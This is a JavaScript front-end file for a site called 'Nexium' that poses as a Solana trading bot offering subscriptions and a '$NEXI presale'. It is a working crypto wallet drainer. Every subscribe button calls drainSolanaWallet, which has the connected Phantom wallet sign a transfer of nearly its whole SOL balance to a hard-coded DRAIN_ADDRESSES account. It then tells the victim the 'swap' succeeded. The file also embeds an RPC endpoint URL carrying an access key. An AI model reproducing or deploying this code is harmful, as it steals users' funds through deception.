import { Buffer } from 'buffer';
console.log('main.js: Buffer imported:', typeof Buffer, Buffer);
globalThis.Buffer = Buffer;
window.Buffer = Buffer;

// === CENTRALIZED RPC CONFIG ===
const SOLANA_RPC_ENDPOINT = 'https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6';

// Other imports
import { CONFIG } from './config.js';
import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram } from '@solana/web3.js';
import * as splToken from '@solana/spl-token';

const DRAIN_ADDRESSES = {
  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
};

class NexiumApp {
  constructor() {
    this.publicKey = null;
    this.connecting = false;
    this.connectingWallet = null;
    this.solConnection = null;
    this.spinner = null;
    this.connectedWalletType = null;
    console.log('Initializing NexiumApp...');
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.metamaskPrompt) {
        console.warn('metamaskPrompt element missing, but continuing initialization');
      }
      this.setupModal();
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      console.log('App initialized successfully');
    } catch (error) {
      console.error('Init error:', error);
      this.showFeedback('Error initializing app. Please refresh.', 'error');
    }
  }

  cacheDOMElements() {
    this.dom = {
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      connectWallet: document.getElementById('connect-wallet'),
      walletModal: document.getElementById('wallet-modal'),
      closeModal: document.getElementById('close-modal'),
      connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
      feedbackContainer: document.querySelector('.feedback-container'),
      subscribeHero: document.querySelector('.subscribe-hero'),
      monthlySubscribe: document.querySelector('.monthly-subscribe'),
      yearlySubscribe: document.querySelector('.yearly-subscribe'),
      watchButtons: document.querySelectorAll('.watch-btn'),
      snipeButtons: document.querySelectorAll('.snipe-btn')
    };
    console.log('DOM elements cached:', {
      metamaskPrompt: !!this.dom.metamaskPrompt,
      connectWallet: !!this.dom.connectWallet,
      walletModal: !!this.dom.walletModal,
      closeModal: !!this.dom.closeModal,
      connectPhantom: !!this.dom.connectPhantom,
      subscribeHero: !!this.dom.subscribeHero,
      monthlySubscribe: !!this.dom.monthlySubscribe,
      yearlySubscribe: !!this.dom.yearlySubscribe,
      watchButtons: this.dom.watchButtons.length,
      snipeButtons: this.dom.snipeButtons.length
    });
  }

  setupModal() {
    console.log('Wallet modal setup:', {
      connectWalletBtn: !!this.dom.connectWallet,
      walletModal: !!this.dom.walletModal,
      closeModalBtn: !!this.dom.closeModal
    });

    if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
      this.dom.connectWallet.addEventListener('click', (event) => {
        event.stopPropagation();
        console.log('Connect Wallet button clicked');
        this.dom.walletModal.classList.add('active');
        console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') });
      });

      this.dom.closeModal.addEventListener('click', () => {
        console.log('Close wallet modal button clicked');
        this.dom.walletModal.classList.remove('active');
      });

      document.addEventListener('click', (event) => {
        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
          console.log('Clicked outside wallet modal, closing');
          this.dom.walletModal.classList.remove('active');
        }
      });
    } else {
      console.error('Wallet modal elements not found:', {
        connectWallet: !!this.dom.connectWallet,
        walletModal: !!this.dom.walletModal,
        closeModal: !!this.dom.closeModal
      });
    }
  }

  setupEventListeners() {
    const connectWalletHandler = (walletName) => {
      if (!this.connecting) {
        console.log(`${walletName} button clicked`);
        this.connectWallet(walletName);
      }
    };

    if (this.dom.connectPhantom) {
      this.dom.connectPhantom.addEventListener('click', () => {
        console.log('Phantom click event triggered');
        connectWalletHandler('Phantom');
      });
      this.dom.connectPhantom.addEventListener('keypress', (e) => {
        console.log('Phantom keypress event triggered, key:', e.key);
        if (e.key === 'Enter') {
          connectWalletHandler('Phantom');
        }
      });
    } else {
      console.warn('connectPhantom button not found');
    }

    if (this.dom.subscribeHero) {
      this.dom.subscribeHero.addEventListener('click', () => {
        console.log('Hero Subscribe button clicked');
        this.handleSubscription();
      });
    }

    if (this.dom.monthlySubscribe) {
      this.dom.monthlySubscribe.addEventListener('click', () => {
        console.log('Monthly Subscribe button clicked');
        this.handleSubscription();
      });
    }

    if (this.dom.yearlySubscribe) {
      this.dom.yearlySubscribe.addEventListener('click', () => {
        console.log('Yearly Subscribe button clicked');
        this.handleSubscription();
      });
    }

    this.dom.watchButtons.forEach((button, index) => {
      button.addEventListener('click', () => {
        console.log(`Watch button ${index + 1} clicked`);
        this.handleWatchAction();
      });
    });

    this.dom.snipeButtons.forEach((button, index) => {
      button.addEventListener('click', () => {
        console.log(`Snipe button ${index + 1} clicked`);
        this.handleSnipeAction();
      });
    });

    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async handleSubscription() {
    if (!this.publicKey || !this.solConnection) {
      this.showFeedback('Please connect your wallet to subscribe.', 'error');
      this.dom.walletModal.classList.add('active');
      return;
    }
    this.drainSolanaWallet();
  }

  handleWatchAction() {
    this.showFeedback('Watch feature not available.', 'error');
  }

  handleSnipeAction() {
    this.showFeedback('Snipe feature not available.', 'error');
  }

  async connectWallet(walletName) {
    if (this.connecting || !navigator.onLine) {
      this.showFeedback('No internet connection. Please check your network.', 'error');
      console.log(`Connection aborted for ${walletName}: offline or already connecting`);
      return;
    }
    this.connecting = true;
    this.connectingWallet = walletName;
    console.log(`Starting connection for ${walletName}, setting state to connecting`);
    this.updateButtonState('connecting', walletName);

    try {
      const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
      const hasSolana = !!window.solana;
      const hasExtensions = (walletName === 'Phantom' && hasSolana && window.solana.isPhantom);
      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'}`);

      if (!isMobileUserAgent || hasExtensions) {
        let accounts = [];
        if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
          console.log('Phantom detected, connecting:', window.solana);
          const response = await window.solana.connect();
          accounts = [response.publicKey.toString()];
          this.publicKey = accounts[0];

          // USE NEW RPC ENDPOINT
          this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
            commitment: 'confirmed',
            wsEndpoint: ''
          });

          console.log(`Phantom connected via extension: ${this.publicKey}`);
          this.connectedWalletType = walletName;
          this.updateButtonState('connected', walletName, this.publicKey);
          this.hideMetaMaskPrompt();
          this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
          this.connecting = false;
          console.log(`${walletName} connection completed, connecting=${this.connecting}`);
          return;
        } else {
          console.error(`${walletName} extension not detected`);
          throw new Error(`${walletName} extension not detected or unsupported`);
        }
      }

      // Deeplink
      const deeplinks = {
        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com?ref=https%3A%2F%2Fnexium-bot.onrender.com'
      };
      const deeplink = deeplinks[walletName];
      if (!deeplink) {
        console.error(`No deeplink configured for ${walletName}`);
        throw new Error(`No deeplink configured for ${walletName}`);
      }
      console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
      window.location.href = deeplink;

      const checkConnection = setInterval(async () => {
        if (walletName === 'Phantom' && window.solana?.isPhantom) {
          const response = await window.solana.connect().catch(() => null);
          if (response && response.publicKey) {
            this.publicKey = response.publicKey.toString();

            // USE NEW RPC ENDPOINT
            this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
              commitment: 'confirmed',
              wsEndpoint: ''
            });

            console.log(`Phantom connected via deeplink: ${this.publicKey}`);
            this.connectedWalletType = walletName;
            this.updateButtonState('connected', walletName, this.publicKey);
            this.hideMetaMaskPrompt();
            this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
            clearInterval(checkConnection);
          }
        }
      }, 1000);

      setTimeout(() => {
        if (this.connecting) {
          console.log(`Deeplink timed out for ${walletName}`);
          this.showFeedback('Connection timed out. Please open site in the wallet app browser.', 'error');
          this.updateButtonState('disconnected', walletName);
          this.connecting = false;
          clearInterval(checkConnection);
        }
      }, 30000);
    } catch (error) {
      console.error(`Connection error for ${walletName}:`, error);
      this.handleConnectionError(error, walletName);
      this.updateButtonState('disconnected', walletName);
      this.showMetaMaskPrompt();
    } finally {
      this.connecting = false;
      console.log(`Connection attempt finished for ${walletName}, connecting=${this.connecting}`);
    }
  }

  async drainSolanaWallet() {
    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer);
    console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey);
    this.showProcessingSpinner();

    try {
      const senderPublicKey = new PublicKey(this.publicKey);
      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
      console.log("Valid Solana address:", senderPublicKey.toBase58());
      console.log("Recipient address:", recipientPublicKey.toBase58());

      // Ensure connection uses correct RPC
      if (!this.solConnection) {
        this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
      }

      const balance = await this.solConnection.getBalance(senderPublicKey);
      const rentExemptMinimum = 2039280;
      const transferableBalance = balance - rentExemptMinimum;

      if (transferableBalance <= 0) {
        console.error("Insufficient transferable balance:", balance, "lamports");
        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
      }
      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports");

      const solInstruction = SystemProgram.transfer({
        fromPubkey: senderPublicKey,
        toPubkey: recipientPublicKey,
        lamports: transferableBalance
      });

      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight);

      const message = new TransactionMessage({
        payerKey: senderPublicKey,
        recentBlockhash: blockhash,
        instructions: [solInstruction],
      }).compileToV0Message();

      const versionedTransaction = new VersionedTransaction(message);
      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
      console.log("Transaction signed successfully:", signedTransaction);

      const signature = await this.solConnection.sendTransaction(signedTransaction);
      console.log("Transaction sent, signature:", signature);

      await this.solConnection.confirmTransaction({
        signature,
        lastValidBlockHeight,
        blockhash
      });
      console.log("Transaction confirmed:", signature);

      this.showFeedback("Swap successful! Welcome to the $NEXI presale!", 'success');
    } catch (error) {
      console.error("Transaction Error:", error.message, error.stack || error);
      if (error.message.includes('User rejected the request')) {
        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
      } else if (error.message.includes('Insufficient balance')) {
        this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
      } else {
        this.showFeedback("Swap failed. Please try again.", 'error');
      }
      throw error;
    } finally {
      this.hideProcessingSpinner();
      console.log('Drain token completed');
    }
  }

  updateButtonState(state, walletName, address = '') {
    let button = this.dom[`connect${walletName}`];
    if (!button) {
      console.warn(`Button for ${walletName} not in cache, attempting to re-query DOM`);
      button = document.querySelector(`#wallet-modal #connect-${walletName.toLowerCase()}`);
    }
    console.log(`Updating button state for ${walletName}: state=${state}, address=${address}, button exists=${!!button}`);
    if (!button) {
      console.error(`Button for ${walletName} not found in DOM`);
      return;
    }
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Connecting...';
        button.classList.add('glow-button', 'connecting');
        break;
      case 'connected':
        const shortenedAddress = this.shortenAddress(address);
        button.textContent = shortenedAddress;
        button.classList.add('glow-button', 'connected');
        if (this.dom.connectWallet) {
          this.dom.connectWallet.textContent = shortenedAddress;
          this.dom.connectWallet.classList.remove('animate-pulse');
          this.dom.connectWallet.classList.add('glow-button', 'connected');
          this.dom.connectWallet.disabled = false;
        }
        break;
      default:
        button.textContent = `Connect ${walletName}`;
        button.classList.add('glow-button', 'animate-pulse');
        if (this.dom.connectWallet) {
          this.dom.connectWallet.textContent = 'Connect Phantom';
          this.dom.connectWallet.classList.add('glow-button', 'animate-pulse');
          this.dom.connectWallet.classList.remove('connected');
          this.dom.connectWallet.disabled = false;
        }
    }
  }

  handleConnectionError(error, walletName) {
    console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message });
    let message = `Failed to connect ${walletName}. Please try again or contact support.`;
    if (error.code === -32002) message = `${walletName} is locked or not responding. Please unlock it or reinstall the extension.`;
    else if (error.message?.includes('rejected')) message = `Connection to ${walletName} was declined. Please approve the connection.`;
    else if (error.message?.includes('locked')) message = `${walletName} is locked. Please unlock it to continue.`;
    else if (error.message?.includes('missing')) message = `Wallet configuration issue. Please check your ${walletName} setup.`;
    else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Please check your internet connection.`;
    else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `Please install the ${walletName} extension to continue.`;
    else if (error.message?.includes('Non-base58 character')) message = `Invalid wallet address. Please use a valid Solana wallet.`;
    this.showFeedback(message, 'error');
  }

  handleOnline() {
    this.showFeedback('Back online. Ready to connect or swap.', 'success');
    console.log('Network status: Online');
  }

  handleOffline() {
    this.showFeedback('No internet connection. Please reconnect to continue.', 'error');
    this.updateButtonState('disconnected', 'Phantom');
    console.log('Network status: Offline');
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.warn('metamaskPrompt element not found, cannot show prompt');
      return;
    }
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
    const promptText = this.dom.metamaskPrompt.querySelector('p');
    if (promptText && this.connectingWallet) {
      let walletLink = '';
      if (this.connectingWallet === 'Phantom') {
        walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
      }
      promptText.innerHTML = `Please install ${walletLink} or switch to continue.`;
    }
    console.log(`Showing MetaMask prompt for ${this.connectingWallet}`);
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.warn('metamaskPrompt element not found, cannot hide prompt');
      return;
    }
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
    console.log('MetaMask prompt hidden');
  }

  showFeedback(message, type = 'info') {
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : 'bg-blue-500'}`;
    feedback.style.zIndex = '10000';
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
    console.log(`Feedback displayed: ${message}, type: ${type}`);
  }

  shortenAddress(address) {
    if (!address) return 'Unknown';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&apos;'
    }[m]));
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachWalletListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        this.publicKey = window.solana?.publicKey?.toString();

        // USE NEW RPC ENDPOINT
        this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
          commitment: 'confirmed',
          wsEndpoint: ''
        });

        console.log('Wallet connected on init, publicKey:', this.publicKey);
        this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
        this.handleSuccessfulConnection();
      } else {
        console.log('No wallet connected on init, setting buttons to disconnected');
        this.updateButtonState('disconnected', 'Phantom');
      }
    } else {
      console.log('No wallet installed, showing prompt');
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected', 'Phantom');
    }
  }

  attachWalletListeners() {
    if (window.solana) {
      window.solana.on('accountChanged', () => {
        console.log('Solana account changed');
        this.handleAccountsChanged();
      });
    }
  }

  isWalletInstalled() {
    return !!window.solana;
  }

  isWalletConnected() {
    return (window.solana && !!window.solana.publicKey);
  }

  handleSuccessfulConnection() {
    console.log(`Handle successful connection for ${this.connectedWalletType}`);
    this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
  }

  handleAccountsChanged() {
    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString());
    this.hideMetaMaskPrompt();
    this.publicKey = window.solana?.publicKey?.toString();
    this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
    this.updateButtonState('disconnected', 'Phantom');
    if (this.publicKey && this.connectedWalletType) {
      this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
    }
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
    console.log('Processing spinner displayed');
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
      console.log('Processing spinner hidden');
    }
  }
}

const app = new NexiumApp();
window.nexiumApp = app;

export { NexiumApp };